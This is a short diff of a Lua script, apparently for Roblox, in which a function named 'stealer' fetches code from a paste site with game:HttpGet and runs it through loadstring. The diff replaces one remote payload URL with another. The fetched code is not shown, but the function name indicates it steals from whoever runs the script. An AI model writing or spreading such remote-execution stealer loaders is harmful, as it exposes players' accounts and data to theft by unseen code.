@@ -1,6 +1,6 @@
 local function stealer()
 
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/oejTRrmd2hb92v2D/raw", true))()
+loadstring(game:HttpGet("https://pastefy.app/rgvZ2cUH/raw"))()
 
 end
 local function loadui()
